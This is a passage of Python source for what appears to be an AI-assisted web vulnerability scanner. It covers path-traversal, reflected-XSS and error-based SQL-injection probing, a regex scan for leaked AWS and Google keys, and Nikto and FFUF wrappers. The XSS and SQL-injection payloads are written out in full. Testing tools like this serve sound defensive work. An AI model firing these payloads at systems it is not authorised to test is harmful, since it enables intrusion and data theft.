                    if pname.lower() not in FILE_PARAMS:
                        continue
                    import urllib.parse as _up2
                    parsed0 = _up2.urlparse(ep_url)
                    base0   = f"{parsed0.scheme}://{parsed0.netloc}{parsed0.path}"
                    if not base0.startswith("http"):
                        base0 = f"{clean_url}{base0}"
                    for tval in LIN_PAYLOADS + WIN_PAYLOADS[:2]:
                        tu = f"{base0}?{pname}={_up2.quote(tval, safe='')}"
                        if tu in tested0:
                            continue
                        tested0.add(tu)
                        code0, hit0, body0 = _probe(tu, ALL_SIGS)
                        if code0 is None:
                            all_results.append(f"  [ TIMEOUT ] {tu}")
                        elif hit0:
                            _record(tu, f"auto:{pname}={tval}", hit0, body0)
                        else:
                            all_results.append(f"  [  SAFE  ] HTTP {code0} | {tu}")
                        phase0_count += 1
            if phase0_count == 0:
                all_results.append("  [  INFO  ] No file-related parameters auto-discovered.")
        except Exception as ex0:
            all_results.append(f"  [  ERR   ] Phase 0 error: {ex0}")

        # Phase 1 — fixed endpoints
        all_results.append("[ Phase 1 — fixed endpoint payloads ]")
        for ep, sigs in FIXED_PAYLOADS:
            full = f"{clean_url}{ep}"
            code, hit, body = _probe(full, sigs)
            if code is None:
                all_results.append(f"  [ TIMEOUT ] {full}")
            elif hit:
                _record(full, ep, hit, body)
            else:
                all_results.append(f"  [  SAFE  ] HTTP {code} | {full}")

        # Phase 2 — href crawl
        all_results.append("\n[ Phase 2 — href parameter injection ]")
        try:
            home = _req.get(clean_url, headers=headers, timeout=15,
                            allow_redirects=True, verify=False).text
            href_links = re.findall(
                r'href=["\']([^"\']+\?[^"\']+)["\']', home, re.IGNORECASE
            )
            tested2 = set()
            for link in href_links[:30]:
                if not link.startswith("http"):
                    link = f"{clean_url}/{link.lstrip('/')}"
                parsed = _up.urlparse(link)
                params = _up.parse_qs(parsed.query)
                for param in params:
                    if param.lower() not in FILE_PARAMS:
                        continue
                    for tval in ALL_PAYLOADS[:8]:
                        q  = _up.urlencode(
                            {**{k: v[0] for k, v in params.items()}, param: tval}
                        )
                        tu = _up.urlunparse(parsed._replace(query=q))
                        if tu in tested2:
                            continue
                        tested2.add(tu)
                        code, hit, body = _probe(tu, ALL_SIGS)
                        if code is None:
                            all_results.append(f"  [ TIMEOUT ] {tu}")
                        elif hit:
                            _record(tu, f"{param}={tval}", hit, body)
                        else:
                            all_results.append(f"  [  SAFE  ] HTTP {code} | {tu}")
            if not href_links:
                all_results.append("  [  INFO  ] No href links with parameters found.")
        except Exception as ex:
            all_results.append(f"  [  ERR   ] Phase 2 error: {ex}")

        # Phase 3 — img src crawl
        all_results.append("\n[ Phase 3 — image src parameter injection ]")
        try:
            home3 = _req.get(clean_url, headers=headers, timeout=15,
                             allow_redirects=True, verify=False).text
            img_pat  = re.compile(
                r'<img[^>]+src=["\']([^"\']+\?[^"\']+)["\']', re.IGNORECASE
            )
            page_pat = re.compile(
                r'href=["\'](/(?:product|item|page|view|detail|shop|category)[^"\']*)["\']',
                re.IGNORECASE
            )
            img_srcs = img_pat.findall(home3)

            for pl in page_pat.findall(home3)[:10]:
                try:
                    sub = _req.get(f"{clean_url}{pl}", headers=headers,
                                   timeout=10, verify=False).text
                    img_srcs.extend(img_pat.findall(sub))
                except Exception:
                    pass

            tested3 = set()
            for src_url in img_srcs[:50]:
                if not src_url.startswith("http"):
                    src_url = f"{clean_url}/{src_url.lstrip('/')}"
                parsed = _up.urlparse(src_url)
                params = _up.parse_qs(parsed.query)
                for param in params:
                    for tval in LIN_PAYLOADS + WIN_PAYLOADS[:2]:
                        q  = _up.urlencode(
                            {**{k: v[0] for k, v in params.items()}, param: tval}
                        )
                        tu = _up.urlunparse(parsed._replace(query=q))
                        if tu in tested3:
                            continue
                        tested3.add(tu)
                        code, hit, body = _probe(tu, ALL_SIGS)
                        if code is None:
                            all_results.append(f"  [ TIMEOUT ] {tu}")
                        elif hit:
                            _record(tu, f"img:{param}={tval}", hit, body)
                        else:
                            all_results.append(f"  [  SAFE  ] HTTP {code} | {tu}")

            if not img_srcs:
                all_results.append(
                    "  [  INFO  ] No image src parameters found on homepage/product pages."
                )
        except Exception as ex:
            all_results.append(f"  [  ERR   ] Phase 3 error: {ex}")

        header = "--- PATH TRAVERSAL RESULTS ---\n"
        detail = "\n".join(all_results)

        if not confirmed:
            timeout_count = sum(1 for l in all_results if "TIMEOUT" in l)
            if timeout_count > 6:
                note = (
                    f"\n[RESULT] {timeout_count} probes timed out — "
                    "likely non-matching tech stack (not a finding)."
                )
            else:
                note = "\n[RESULT] No confirmed path traversal vulnerabilities."
            return header + detail + note

        summary = [
            f"\n{'='*60}",
            f"[CONFIRMED] {len(confirmed)} CRITICAL PATH TRAVERSAL FINDING(S):",
            f"{'='*60}",
        ]
        for fu, pl, sig, body in confirmed:
            summary.append(f"\n  URI     : {fu}")
            summary.append(f"  Payload : {pl}")
            summary.append(f"  Matched : '{sig}'")
            summary.append(f"  Evidence:\n{body[:600]}")
        return header + detail + "\n" + "\n".join(summary)



    # ─── XSS DETECTION ────────────────────────────────────────────────────────

    def check_xss(self, url: str) -> str:
        """Reflected XSS — multi-phase scanner with marker probes and context-aware payloads."""
        import requests as _req
        import urllib.parse as _up
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        raw = url.strip()
        if not raw.startswith(('http://', 'https://')):
            # Default to https:// — was defaulting to http://, inconsistent
            # with check_path_traversal()/check_sqli() (both default https)
            # and wrong for HTTPS-only targets (e.g. PortSwigger Web Security
            # Academy labs), where an http:// probe can fail/behave
            # differently and silently miss a reflected-XSS finding.
            raw = f"https://{raw.lstrip('/')}"
        clean_url = raw.rstrip('/')
        target = self._extract_domain(url)
        MARKER = "ARGUSxSS7"
        TIMEOUT = 8
        MAX_BODY = 8000
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

        # Light payloads first — heavy <script> probes often hang behind WAFs.
        PAYLOADS = [
            MARKER,
            f'"><b>{MARKER}</b>',
            f'"><img src=x onerror=alert({MARKER})>',
            f'" onfocus=alert({MARKER}) autofocus="',
            f'<svg/onload=alert({MARKER})>',
            f"<script>alert('{MARKER}')</script>",
        ]

        EXEC_SIGS = (
            "<script", "onerror=", "onload=", "onfocus=", "onmouseover=",
            "javascript:", "<svg", "<iframe", "<body", "<input",
        )

        FIXED_XSS_ENDPOINTS = [
            ("Login.asp", "RetURL"),
            ("Register.asp", "RetURL"),
            ("Search.asp", "tfSearch"),
            ("showforum.asp", "id"),
            ("listproducts.asp", "cat"),
            ("Templatize.asp", "item"),
            ("search.php", "test"),
            ("search.php", "searchFor"),
            ("listproducts.php", "cat"),
            ("artists.php", "artist"),
            ("guestbook.php", "name"),
            ("hpp/", "pp"),
            ("showimage.php", "file"),
        ]

        COMMON_PARAMS = ("q", "s", "search", "query", "id", "name", "keyword", "term", "test")

        all_results = []
        confirmed = []
        tested = set()
        dead_endpoints = set()
        timeout_counts = {}

        def _fetch_limited(req_url, method="GET", data=None):
            try:
                if method == "POST":
                    resp = _req.post(req_url, headers=headers, data=data, timeout=TIMEOUT,
                                     allow_redirects=True, verify=False, stream=True)
                else:
                    resp = _req.get(req_url, headers=headers, timeout=TIMEOUT,
                                    allow_redirects=True, verify=False, stream=True)
                content = b""
                for chunk in resp.iter_content(chunk_size=1024):
                    content += chunk
                    if len(content) >= MAX_BODY:
                        break
                resp.close()
                ctype = resp.headers.get("Content-Type", "")
                return resp.status_code, content.decode("utf-8", errors="ignore"), ctype
            except Exception as e:
                return None, str(e), ""

        def _snippet(body, needle):
            idx = body.find(needle)
            if idx < 0:
                return ""
            return body[max(0, idx - 60):idx + len(needle) + 60].replace("\n", " ").strip()

        def _classify(body, payload, content_type=""):
            """Return (severity, reason) when XSS is detected, else None."""
            if not body or not isinstance(body, str):
                return None

            # A reflected marker only executes as XSS inside an HTML document.
            # If the server explicitly returns CSS / JSON / plain JS / fonts / images
            # (e.g. a Google-Fonts style '?family=' endpoint), a reflection there is
            # NOT HTML XSS — skip it to avoid false positives.
            ct = (content_type or "").lower()
            if ct and not any(h in ct for h in ("text/html", "application/xhtml")):
                if any(x in ct for x in (
                    "text/css", "application/json", "text/javascript",
                    "application/javascript", "font", "image/", "text/plain",
                )):
                    return None

            marker_hit = MARKER in body
            payload_hit = payload in body

            if payload_hit and any(sig in payload.lower() for sig in EXEC_SIGS):
                return "High", "executable payload reflected unencoded"

            if marker_hit:
                snippet = _snippet(body, MARKER)
                encoded_only = (
                    "&lt;script" in body.lower()
                    and "<script" not in body.lower()
                    and "onerror=" not in body.lower()
                )
                if encoded_only and MARKER in body:
                    return None

                if any(sig in snippet.lower() for sig in EXEC_SIGS):
                    return "High", "marker reflected near executable HTML/JS context"

                if re.search(rf'>\s*{re.escape(MARKER)}\s*<', snippet, re.I):
                    return "High", "marker reflected between HTML tags (unencoded)"

                if re.search(
                    rf'=\s*["\']?[^"\'>\s]*{re.escape(MARKER)}',
                    snippet, re.I
                ):
                    return "Medium", "marker reflected inside HTML attribute (potential breakout XSS)"

                if payload_hit or marker_hit:
                    return "Medium", "user input reflected unencoded in response"

            return None

        def _record(method, page, param, payload, test_url, severity, reason, body):
            for existing in confirmed:
                if existing["method"] == method and existing["page"] == page and existing["param"] == param:
                    if existing["severity"] == "High" or severity == "Medium":
                        return False
                    confirmed.remove(existing)
                    break
            snippet = _snippet(body, MARKER if MARKER in body else payload)
            tag = "[HIGH] Reflected XSS CONFIRMED" if severity == "High" else "[MEDIUM] Reflected XSS SUSPECTED"
            confirmed.append({
                "tag": tag, "method": method, "page": page, "param": param,
                "payload": payload, "url": test_url, "reason": reason, "snippet": snippet,
                "severity": severity,
            })
            # raw_data carries full PoC detail (method/URL/param/payload/evidence),
            # not just the context snippet, so the report/agent layer can build a
            # reproduction-steps section without re-deriving it from the LLM.
            poc = (f"Method: {method}\nURL: {test_url}\nParam: {param}\n"
                   f"Payload: {payload}\nEvidence: {snippet}")
            self.memory.add_finding(
                target, "xss_scanner", "vulnerability",
                poc, f"Reflected XSS on param '{param}' — {reason}",
                severity=severity,
            )
            return True

        def _inject_params(base_path, params, inject_param, payload):
            merged = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            merged[inject_param] = payload
            query = _up.urlencode(merged)
            return f"{base_path}?{query}"

        def _build_get_url(base_path, param, payload, other_params):
            params = {**other_params, param: "1"}
            return _inject_params(base_path, params, param, payload)

        def _run_probe(method, base_path, param, payload, other_params=None, extra_fields=None):
            """Returns ('hit'|'safe'|'timeout', body, request_target)."""
            page = base_path.rsplit("/", 1)[-1] or base_path
            if method == "GET":
                test_url = _build_get_url(base_path, param, payload, other_params or {})
                sig = (method, test_url, param, payload)
                if sig in tested:
                    return "safe", "", test_url
                tested.add(sig)
                code, body, ctype = _fetch_limited(test_url)
                target_ref = test_url
            else:
                data = dict(extra_fields or {})
                data[param] = payload
                sig = (method, base_path, param, payload)
                if sig in tested:
                    return "safe", "", base_path
                tested.add(sig)
                code, body, ctype = _fetch_limited(base_path, method="POST", data=data)
                target_ref = base_path

            if code is None:
                key = (method, base_path, param)
                timeout_counts[key] = timeout_counts.get(key, 0) + 1
                if timeout_counts[key] >= 2:
                    dead_endpoints.add(base_path)
                all_results.append(f"  [ TIMEOUT ] {method} {param} on {page}")
                return "timeout", "", target_ref

            verdict = _classify(body, payload, ctype)
            if verdict:
                severity, reason = verdict
                if _record(method, page, param, payload, target_ref, severity, reason, body):
                    all_results.append(
                        f"  [{severity.upper()}] {method} {page} param '{param}' — {reason}"
                    )
                return "hit", body, target_ref
            return "safe", body, target_ref

        def _probe_param(method, base_path, param, other_params=None, extra_fields=None):
            if base_path in dead_endpoints:
                return
            other_params = other_params or {}

            status, body, _ = _run_probe(
                method, base_path, param, MARKER, other_params, extra_fields
            )
            if status == "timeout":
                return
            if status == "safe" and MARKER not in body:
                page = base_path.rsplit("/", 1)[-1] or base_path
                all_results.append(f"  [  SAFE  ] {method} {param} on {page}")
                return

            for payload in PAYLOADS[1:]:
                if base_path in dead_endpoints:
                    break
                hit_status, _, _ = _run_probe(
                    method, base_path, param, payload, other_params, extra_fields
                )
                if hit_status == "hit":
                    page = base_path.rsplit("/", 1)[-1] or base_path
                    if any(
                        c["param"] == param and c["page"] == page and c["severity"] == "High"
                        for c in confirmed
                    ):
                        return
                if hit_status == "timeout":
                    break

        # ── Phase 0: parameters on the user-supplied URL ───────────────────────
        all_results.append("[ Phase 0 — user-supplied URL parameters ]")
        parsed_input = _up.urlparse(clean_url)
        input_params = _up.parse_qs(parsed_input.query)
        if input_params:
            base_path = f"{parsed_input.scheme}://{parsed_input.netloc}{parsed_input.path}"
            for param in list(input_params.keys())[:8]:
                other = {k: v[0] for k, v in input_params.items() if k != param}
                _probe_param("GET", base_path, param, other)
        else:
            all_results.append("  [  SKIP  ] No query parameters on target URL")

        # ── Phase 1: known vulnerable endpoint patterns ────────────────────────
        all_results.append("\n[ Phase 1 — known XSS endpoint patterns ]")
        origin = f"{parsed_input.scheme}://{parsed_input.netloc}"
        for page, param in FIXED_XSS_ENDPOINTS:
            _probe_param("GET", f"{origin}/{page}", param)

        # ── Phase 2: forms (GET + POST) and links from homepage ───────────────
        all_results.append("\n[ Phase 2 — discovered forms and parameterised links ]")
        try:
            code, page, _ct = _fetch_limited(clean_url)
            if code is None:
                raise RuntimeError(page)
        except Exception as e:
            return f"[ERROR] Could not fetch page: {e}"

        forms = re.findall(
            r'<form\b([^>]*)>(.*?)</form>',
            page, re.IGNORECASE | re.DOTALL
        )
        for attrs, inner in forms[:15]:
            action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            method_m = re.search(r'method=["\']([^"\']*)["\']', attrs, re.I)
            action = (action_m.group(1) if action_m else "").strip()
            method = (method_m.group(1) if method_m else "get").upper()
            if not action or action.startswith("#"):
                action = clean_url
            if not action.startswith("http"):
                action = f"{origin}/{action.lstrip('./')}"
            fields = re.findall(
                r'<(?:input|textarea)\b[^>]*name=["\']([^"\']+)["\']',
                inner, re.I
            )
            hidden = {}
            for hm in re.finditer(
                r'<input\b[^>]*type=["\']hidden["\'][^>]*>', inner, re.I
            ):
                tag = hm.group(0)
                n = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                v = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                if n:
                    hidden[n.group(1)] = v.group(1) if v else ""
            for field in fields[:6]:
                if field.lower() in ("submit", "button", "csrf", "token"):
                    continue
                if method == "POST":
                    _probe_param("POST", action, field, extra_fields=hidden)
                else:
                    _probe_param("GET", action, field, hidden)

        links = set(re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']', page, re.I))
        links.update(re.findall(r'action=["\']([^"\']+\?[^"\']+)["\']', page, re.I))
        for link in list(links)[:25]:
            if not link.startswith("http"):
                link = f"{origin}/{link.lstrip('./')}"
            parsed = _up.urlparse(link)
            params = _up.parse_qs(parsed.query)
            base_path = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in list(params.keys())[:5]:
                other = {k: v[0] for k, v in params.items() if k != param}
                _probe_param("GET", base_path, param, other)

        # ── Phase 2.5: AI auto-discovered parameters ──────────────────────────
        all_results.append("\n[ Phase 2.5 — AI auto-discovered parameters ]")
        try:
            auto_params_xss = self._discover_parameters(clean_url)
            for ep_url, pnames in auto_params_xss.items():
                import urllib.parse as _up_xss
                parsed_ep = _up_xss.urlparse(ep_url)
                base_ep = f"{parsed_ep.scheme}://{parsed_ep.netloc}{parsed_ep.path}"
                if not base_ep.startswith("http"):
                    base_ep = f"{origin}/{base_ep.lstrip('/')}"
                for pname in list(pnames)[:8]:
                    if pname.lower() in ("submit", "button", "csrf", "token"):
                        continue
                    _probe_param("GET", base_ep, pname)
        except Exception as ex_xss:
            all_results.append(f"  [  ERR   ] Phase 2.5 error: {ex_xss}")

        # ── Phase 3: common parameter fuzz (only if nothing found yet) ───────
        if not confirmed:
            all_results.append("\n[ Phase 3 — common parameter fuzz on discovered paths ]")
            paths = set(re.findall(
                r'href=["\']([^"\']+\.(?:asp|php|aspx|jsp)[^"\']*)["\']', page, re.I
            ))
            paths.update(p for p, _ in FIXED_XSS_ENDPOINTS)
            for path in list(paths)[:8]:
                if path.startswith("http"):
                    parsed = _up.urlparse(path)
                    base_path = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                else:
                    base_path = f"{origin}/{path.lstrip('./').split('?')[0]}"
                for param in COMMON_PARAMS[:3]:
                    _probe_param("GET", base_path, param)
                    if confirmed:
                        break
                if confirmed:
                    break
        else:
            all_results.append("\n[ Phase 3 — skipped (findings already detected) ]")

        header = "--- XSS SCAN RESULTS ---\n"
        detail = "\n".join(all_results)

        if not confirmed:
            return (header + detail +
                    f"\n\n[RESULT] No reflected XSS found. "
                    f"Tested {len(tested)} payload injection(s).")

        unique = []
        seen = set()
        for hit in confirmed:
            sig = (hit["method"], hit["page"], hit["param"], hit["severity"])
            if sig in seen:
                continue
            seen.add(sig)
            unique.append(hit)

        summary = [f"\n{'='*60}",
                   f"[CONFIRMED] {len(unique)} REFLECTED XSS FINDING(S):",
                   f"{'='*60}"]
        for hit in unique[:10]:
            summary.append(f"\n  {hit['tag']}")
            summary.append(f"  Method  : {hit['method']}")
            summary.append(f"  Page    : {hit['page']}")
            summary.append(f"  Param   : {hit['param']}")
            summary.append(f"  Payload : {hit['payload'][:80]}")
            summary.append(f"  URL     : {hit['url'][:200]}")
            summary.append(f"  Reason  : {hit['reason']}")
            summary.append(f"  Proof   : ...{hit['snippet']}...")

        return header + detail + "\n" + "\n".join(summary)

    # ─── SQL INJECTION ────────────────────────────────────────────────────────

    def check_sqli(self, url: str) -> str:
        """Error-based SQL injection detection — confirmed only on DB error string match."""
        import requests as _req
        import urllib.parse as _up
        import urllib3
        urllib3.disable_warnings()

        clean_url = url.strip().rstrip('/')
        if not clean_url.startswith(('http://', 'https://')):
            clean_url = f"https://{clean_url}"
        target = self._extract_domain(clean_url)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

        # MSSQL / MySQL / Oracle / PostgreSQL error fingerprints
        SQL_ERRORS = [
            "unclosed quotation mark after the character string",   # MSSQL
            "microsoft ole db provider for sql server",             # MSSQL
            "[microsoft][odbc sql server driver]",                  # MSSQL ODBC
            "incorrect syntax near",                                # MSSQL
            "you have an error in your sql syntax",                 # MySQL
            "warning: mysql_",                                      # PHP+MySQL
            "supplied argument is not a valid mysql",               # PHP+MySQL
            "ora-01756",                                            # Oracle
            "ora-00933",                                            # Oracle
            "quoted string not properly terminated",                # Oracle
            "pg_query()",                                           # PostgreSQL
            "syntax error at or near",                              # PostgreSQL
            "odbc microsoft access driver",                         # Access
            "microsoft jet database engine error",                  # Access/Jet
        ]

        # Error-triggering payloads (minimal, reliable)
        PAYLOADS = ["'", "''", "`", "1' OR '1'='1'--", "1\" OR \"1\"=\"1\"--"]

        # Fixed ASP.NET endpoint patterns common on testasp.vulnweb.com
        FIXED_ENDPOINTS = [
            ("listproducts.asp", "cat"),
            ("showthread.asp",   "id"),
            ("showforum.asp",    "id"),
            ("read.asp",         "id"),
            ("guestbook.asp",    "id"),
            ("comment.asp",      "id"),
        ]

        all_results = []
        confirmed = []
        tested = set()

        def _test_param(base_url, param):
            """Inject each payload into param at base_url (base_url ends with 'param=')."""
            hits = []
            for payload in PAYLOADS:
                full = base_url + _up.quote(payload, safe="")
                if full in tested:
                    continue
                tested.add(full)
                try:
                    r = _req.get(full, headers=headers, timeout=8,
                                 allow_redirects=True, verify=False)
                    body_lower = r.text[:8000].lower()
                    hit = next((e for e in SQL_ERRORS if e in body_lower), None)
                    if hit:
                        idx = body_lower.index(hit)
                        snippet = r.text[max(0, idx - 40):idx + len(hit) + 120].replace('\n', ' ').strip()
                        hits.append({"url": full, "param": param, "payload": payload,
                                     "error": hit, "snippet": snippet})
                except Exception:
                    pass
            return hits

        # ── Phase 1: fixed ASP.NET endpoints ──────────────────────────────────
        all_results.append("[ Phase 1 — fixed ASP.NET endpoints ]")
        for page, param in FIXED_ENDPOINTS:
            base = f"{clean_url}/{page}?{param}=1"
            # Build base URL ending with param=
            base_inject = f"{clean_url}/{page}?{param}="
            hits = _test_param(base_inject, param)
            if hits:
                for h in hits:
                    all_results.append(
                        f"  [CRITICAL] {h['url']}\n"
                        f"             Param  : {h['param']}\n"
                        f"             Payload: {h['payload']}\n"
                        f"             Error  : {h['error']}\n"
                        f"             Snippet: ...{h['snippet']}..."
                    )
                    confirmed.extend(hits)
            else:
                all_results.append(f"  [  SAFE  ] {clean_url}/{page}?{param}=... (no error)")

        # ── Phase 2: discovered parameterised links ────────────────────────────
        all_results.append("\n[ Phase 2 — discovered parameter injection ]")
        try:
            page_html = _req.get(clean_url, headers=headers, timeout=10,
                                 allow_redirects=True, verify=False).text
            links = re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']', page_html, re.IGNORECASE)
            for link in links[:20]:
                if not link.startswith('http'):
                    link = f"{clean_url}/{link.lstrip('/')}"
                parsed = _up.urlparse(link)
                params = _up.parse_qs(parsed.query)
                for param in list(params.keys())[:3]:
                    other = {k: v[0] for k, v in params.items() if k != param}
                    qs_prefix = (_up.urlencode(other) + "&") if other else ""
                    base_inject = (f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                                   f"?{qs_prefix}{param}=")
                    hits = _test_param(base_inject, param)
                    if hits:
                        for h in hits:
                            all_results.append(
                                f"  [CRITICAL] {h['url']}\n"
                                f"             Param  : {h['param']}\n"
                                f"             Payload: {h['payload']}\n"
                                f"             Error  : {h['error']}\n"
                                f"             Snippet: ...{h['snippet']}..."
                            )
                        confirmed.extend(hits)
                    else:
                        all_results.append(f"  [  SAFE  ] {param} on {parsed.path} — no error")
        except Exception as e:
            all_results.append(f"  [  ERR   ] Could not fetch page for Phase 2: {e}")

        # ── Phase 3: AI auto-discovered parameters ────────────────────────────
        all_results.append("\n[ Phase 3 — AI auto-discovered parameter injection ]")
        try:
            import urllib.parse as _up_sq
            auto_params_sq = self._discover_parameters(clean_url)
            phase3_count = 0
            for ep_url, pnames in auto_params_sq.items():
                parsed_ep3 = _up_sq.urlparse(ep_url)
                base_ep3   = f"{parsed_ep3.scheme}://{parsed_ep3.netloc}{parsed_ep3.path}"
                if not base_ep3.startswith("http"):
                    base_ep3 = f"{clean_url}/{base_ep3.lstrip('/')}"
                for pname in list(pnames)[:6]:
                    other_sq = {}
                    base_inject3 = f"{base_ep3}?{pname}="
                    hits3 = _test_param(base_inject3, pname)
                    if hits3:
                        for h in hits3:
                            all_results.append(
                                f"  [CRITICAL] {h['url']}\n"
                                f"             Param  : {h['param']}\n"
                                f"             Payload: {h['payload']}\n"
                                f"             Error  : {h['error']}\n"
                                f"             Snippet: ...{h['snippet']}..."
                            )
                        confirmed.extend(hits3)
                    else:
                        all_results.append(
                            f"  [  SAFE  ] {pname} on {parsed_ep3.path or '/'} — no error"
                        )
                    phase3_count += 1
            if phase3_count == 0:
                all_results.append("  [  INFO  ] No additional parameters auto-discovered.")
        except Exception as ex_sq:
            all_results.append(f"  [  ERR   ] Phase 3 error: {ex_sq}")

        # ── Save confirmed to memory ───────────────────────────────────────────
        seen_urls = set()
        unique_confirmed = []
        for h in confirmed:
            if h['url'] not in seen_urls:
                seen_urls.add(h['url'])
                unique_confirmed.append(h)
                # raw_data carries full PoC detail (URL/param/payload/error/evidence),
                # not just the snippet, so the report/agent layer can build a
                # reproduction-steps section without re-deriving it from the LLM.
                poc = (f"URL: {h['url']}\nParam: {h['param']}\nPayload: {h['payload']}\n"
                       f"Error: {h['error']}\nEvidence: {h['snippet']}")
                self.memory.add_finding(
                    target, "sqli_scanner", "vulnerability",
                    poc, f"SQL Injection on param '{h['param']}' — error: {h['error'][:60]}",
                    severity="Critical"
                )
                self.memory.upsert_entity("vulnerability", f"SQLi:{target}:{h['param']}",
                                          {"payload": h['payload'], "error": h['error']})

        header = "--- SQL INJECTION RESULTS ---\n"
        detail = "\n".join(all_results)

        if not unique_confirmed:
            return (header + detail +
                    f"\n\n[RESULT] No SQL injection confirmed. "
                    f"Tested {len(tested)} URL+payload combinations.")

        summary = [f"\n{'='*60}",
                   f"[CONFIRMED] {len(unique_confirmed)} CRITICAL SQL INJECTION FINDING(S):",
                   f"{'='*60}"]
        for h in unique_confirmed[:5]:
            summary.append(f"\n  URL    : {h['url']}")
            summary.append(f"  Param  : {h['param']}")
            summary.append(f"  Payload: {h['payload']}")
            summary.append(f"  Error  : {h['error']}")
            summary.append(f"  Proof  : ...{h['snippet']}...")
        return header + detail + "\n" + "\n".join(summary)

    # ─── SECRETS ANALYSIS ─────────────────────────────────────────────────────

    def analyze_secrets(self, url: str) -> str:
        """Scans page HTML for leaked secrets using Python requests."""
        import requests as _req
        import urllib3; urllib3.disable_warnings()
        hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        # Defensive: ensure a scheme so requests never raises "No scheme supplied".
        if not url.startswith(("http://", "https://")):
            url = "http://" + url.lstrip("/")
        try:
            body = _req.get(url, headers=hdrs, timeout=10,
                            allow_redirects=True, verify=False).text[:50000]
        except Exception as e:
            return f"Secrets scan error: {e}"
        clean_target = self._extract_domain(url)
        PATTERNS = {
            "Email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "API Key": r'(?:key|api|token|secret|auth)[\-_=:]+([a-zA-Z0-9]{20,})',
            "Google API Key": r'AIza[0-9A-Za-z-_]{35}',
            "AWS Access Key": r'AKIA[0-9A-Z]{16}',
            "S3 Bucket": r'[a-z0-9.-]+\.s3\.amazonaws\.com',
            "Firebase": r'[a-z0-9-]+\.firebaseio\.com'
        }
        # Emails from known transactional / marketing platforms are not secrets.
        # Flagging them as High severity inflates the risk score with false positives.
        _EMAIL_NOISE_DOMAINS = {
            "sendinblue.com", "brevo.com", "mailchimp.com", "sendgrid.net",
            "mailgun.org", "sparkpost.com", "mandrillapp.com", "postmarkapp.com",
            "amazonses.com", "amazonaws.com", "google.com", "googlemail.com",
            "microsoft.com", "apple.com", "cloudflare.com", "w3.org",
            "schema.org", "example.com", "sentry.io", "intercom.io",
            "hubspot.com", "salesforce.com", "zendesk.com",
        }

        found = []
        for name, pattern in PATTERNS.items():
            matches = list(set(re.findall(pattern, body, re.IGNORECASE)))[:5]
            if name == "Email":
                # Drop emails whose domain (or any parent domain) is a known service
                # provider. Must match SUBDOMAINS too: 'o101443.ingest.sentry.io' is a
                # Sentry DSN, not a secret — the old '==' check missed it.
                def _is_noise_email(addr):
                    if "@" not in addr:
                        return False
                    dom = addr.lower().rsplit("@", 1)[1]
                    return any(dom == d or dom.endswith("." + d) for d in _EMAIL_NOISE_DOMAINS)
                matches = [m for m in matches if not _is_noise_email(m)]
            if matches:
                found.append(f"[!] {name}: {', '.join(matches)}")
                for m in matches:
                    self.memory.upsert_entity("secret", m, {"category": name})
                    self.memory.add_relation(clean_target, m, "EXPOSES")
        if not found:
            return "No obvious secrets found in page HTML."
        return "--- LEAKED SECRETS ---\n" + "\n".join(found)

    # ─── NIKTO ────────────────────────────────────────────────────────────────

    def run_nikto(self, url: str) -> str:
        """Runs Nikto web vulnerability scanner inside Kali.

        WSL/Kali often cannot resolve external DNS names even when Windows can.
        Fix: resolve the IP on the Windows side with socket.gethostbyname(), then
        pass the numeric IP to Nikto with -vhost so virtual-hosting still works.
        """
        import socket as _wsock
        clean_url = url.strip()
        if not clean_url.startswith('http'):
            clean_url = f"https://{clean_url}"
        # Safety: validate target before injecting into shell command
        target_domain = self._extract_domain(clean_url)
        is_valid, reason = self.safety.validate_target(target_domain, self.scan_mode)
        if not is_valid:
            return f"[SAFETY BLOCK] Nikto aborted: {reason}"

        # Resolve IP on Windows so WSL does not need working DNS
        try:
            target_ip = _wsock.gethostbyname(target_domain)
        except Exception as dns_err:
            return (
                f"[SKIP] Nikto: could not resolve {target_domain} ({dns_err}).\n"
                f"  Run manually from Kali: nikto -h {target_domain}"
            )

        print(f"[*] Running Nikto on: {target_domain} ({target_ip})")
        quoted_ip   = shlex.quote(target_ip)
        quoted_host = shlex.quote(target_domain)
        use_ssl     = "1" if clean_url.startswith("https") else "0"
        ssl_flag    = "-ssl" if use_ssl == "1" else ""
        res = self.run(
            f"nikto -h {quoted_ip} {ssl_flag} -vhost {quoted_host} "
            f"-nointeractive -maxtime 120s -Format txt 2>/dev/null"
        )
        findings = [l for l in res.split('\n') if l.strip().startswith('+')]
        target = self._extract_domain(clean_url)
        # Separate genuinely informational Nikto lines (headers, allowed methods, etc.)
        # from real vulnerability findings so they don't inflate the severity score.
        _INFO_NIKTO = (
            "server:", "x-powered-by", "allowed http methods", "retrieved",
            "anti-clickjacking", "x-content-type", "x-xss-protection",
            "target ip:", "target hostname:", "target port:", "start time:",
            "end time:", "1 host(s) tested", "no cgi-bin", "cookie",
        )
        for f in findings:
            fl = f.lower()
            sev = "Info" if any(p in fl for p in _INFO_NIKTO) else "Medium"
            self.memory.add_finding(target, "nikto", "vulnerability", f, "Nikto finding", severity=sev)
        return f"--- NIKTO REPORT ---\n{res}"

    # ─── FFUF ─────────────────────────────────────────────────────────────────

    def run_ffuf_discovery(self, url: str) -> str:
        """Runs FFUF for directory/path discovery (aggressive mode only)."""
        if self.scan_mode != "aggressive":
            return "[INFO] FFUF directory brute-force is only available in aggressive mode."
        clean_url = url.strip().rstrip('/')
        if not clean_url.startswith('http'):
            clean_url = f"https://{clean_url}"
        # Safety: validate target before injecting into shell command
        target_domain = self._extract_domain(clean_url)
        is_valid, reason = self.safety.validate_target(target_domain, self.scan_mode)
        if not is_valid:
            return f"[SAFETY BLOCK] FFUF aborted: {reason}"
